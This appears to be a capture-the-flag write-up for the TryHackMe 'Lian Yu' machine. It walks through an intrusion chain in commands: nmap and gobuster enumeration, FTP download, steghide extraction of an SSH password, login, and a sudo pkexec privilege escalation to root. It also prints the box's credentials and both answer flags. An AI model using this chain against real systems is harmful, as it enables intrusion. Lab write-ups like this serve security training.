# 🏝️ Lian Yu – TryHackMe Pentest Report

---

## 📌 TARGET INFORMATION

IP Address : 10.48.137.137
Operating System: Linux
Services : FTP, SSH, HTTP, RPC


---

## 🧠 OVERVIEW

Lian Yu is a TryHackMe machine inspired by *Arrow (Deathstroke storyline)*.  
The objective is to perform full enumeration, extract hidden data, gain access, and escalate privileges.

---

# 🔎 1. RECONNAISSANCE


nmap -sC -sV -A 10.48.137.137


---

## 📊 RESULTS


PORT SERVICE VERSION
21/tcp FTP vsftpd 3.0.2
22/tcp SSH OpenSSH 6.7p1
80/tcp HTTP Apache (Purgatory)
111/tcp rpcbind Linux RPC


---

## 🧠 ANALYSIS

- FTP is exposed → possible file leakage
- Web server → enumeration required
- SSH → potential final access vector

---

# 🌐 2. WEB ENUMERATION


gobuster dir -u http://10.48.137.137

-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


---

## 📂 FINDINGS


/island
/server-status (403 Forbidden)


---

## 🧠 ANALYSIS

- `/island` is main entry point
- `/server-status` restricted

---

# 🌐 3. DEEP WEB ENUMERATION

---

## 📍 DISCOVERED PATHS


/island/2100
/green_arrow.ticket


---

## 🧠 ANALYSIS

- “2100” likely hidden directory logic
- ticket file suggests credential leak

---

# 📂 4. FTP ENUMERATION


ftp 10.48.165.72


---

## 👤 LOGIN


Username: vigilante
Password: (provided / derived)


---

## 📁 FILES FOUND


Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user


---

## 📥 DOWNLOAD


mget *


---

# 🕵️ 5. HIDDEN FILE ANALYSIS


cat .other_user


---

## 🧠 RESULT

Contains lore about **Slade Wilson (Deathstroke)**.

---

## 🔎 IMPACT

- Reveals SSH username: `slade`
- Provides narrative context

---

# 🧩 6. STEGANOGRAPHY


steghide --extract -sf aa.jpg


---

## 📦 OUTPUT


ss.zip


---

## 📂 EXTRACTION


unzip ss.zip


---

## 📁 FILES


passwd.txt
shado


---

## 🔐 PASSWORD FOUND


cat shado

M3tahuman


---

# 🔑 7. SSH ACCESS


ssh slade@10.48.137.137


---

## 🔐 PASSWORD


M3tahuman


---

## ✅ RESULT

User access obtained successfully.

---

# 👤 8. USER FLAG


cat user.txt


---

## 🏁 FLAG


THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}


---

# ⚙️ 9. PRIVILEGE ESCALATION


sudo -l


---

## 📌 RESULT


(root) PASSWD: /usr/bin/pkexec


---

## 💥 EXPLOIT


sudo -u root /usr/bin/pkexec /bin/bash


---

## 👑 RESULT

Root access achieved.

---

# 👑 10. ROOT FLAG


cat root.txt


---

## 🏁 FLAG


THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}


---

# 🧾 FINAL SUMMARY


[+] Nmap enumeration
[+] Web directory brute force
[+] FTP exploitation
[+] Hidden file analysis
[+] Steganography extraction
[+] SSH login
[+] Privilege escalation via pkexec


---

# 💬 CONCLUSION

This machine emphasizes:

- Deep enumeration
- Hidden file analysis
- Steganography usage
- Misconfigured privilege escalation

Small clues ultimately lead to full system compromise.
